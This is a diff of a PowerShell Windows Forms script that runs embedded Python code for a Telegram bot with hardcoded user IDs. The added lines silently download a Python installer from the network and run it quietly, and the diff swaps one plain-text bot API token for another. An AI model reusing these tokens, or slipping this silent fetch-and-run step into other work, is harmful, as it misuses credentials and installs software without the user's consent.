@@ -1,5 +1,27 @@
-﻿Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+
+
+$pythonInstalled = $null -ne (Get-Command python -ErrorAction SilentlyContinue)
+
+if (-not $pythonInstalled) {
+    
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    
+    
+    $uri = "https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe"
+    $outFile = "c:/temp/python-3.7.0.exe"
+    
+    
+    Invoke-WebRequest -Uri $uri -OutFile $outFile
+    
+    
+    & $outFile /quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0
+} else {
+
+}
+
+pip install telebot -q
 
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "шарфееек"
@@ -79,7 +101,7 @@ function Run-PythonCode {
 $pythonCode = @"
 import telebot
 
-API_TOKEN = '7159840167:AAGUcb0eZ0EYQxJ28rDCDjvatNV-4qr2wQs'
+API_TOKEN = '6730763327:AAGxl4cAcyersiVS3uHh69IPf8HgJhPhDK8'
 bot = telebot.TeleBot(API_TOKEN)
 
 # Hardcoded user IDs
